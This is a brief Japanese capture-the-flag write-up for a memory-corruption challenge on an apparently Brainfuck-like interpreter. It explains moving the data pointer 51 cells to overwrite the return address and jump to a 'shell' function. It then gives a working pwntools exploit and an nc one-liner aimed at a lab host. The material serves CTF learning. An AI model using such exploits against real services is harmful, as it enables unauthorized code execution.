# ポイント

- ほぼリバーシング。気合い。
  => switch文を丁寧に追えば、なんとかやってることは分かる。
- 書き換えるアドレス
  => 入力する最初のアドレスが `ebp-0xC8` なので `>` を51回入力してやれば `ebp + 0x4` のリターンアドレスに到達する。
- 飛ばす先
  => shellという関数があるので、そのアドレスに飛ばせば良い。



# 解法

```python
from pwn import *
rhp = {'host': '192.168.33.20', 'port':1234}

conn = remote(rhp['host'], rhp['port'])

res = conn.recv()
log.info(res)
payload = ">" * 51 + "-" * 47

conn.sendline(payload)
conn.interactive()

```

これくらないならワンライナーでも。

```
(python -c 'print(">" * 51 + "-" * 47)'; cat -) | nc 192.168.33.20 1234
```







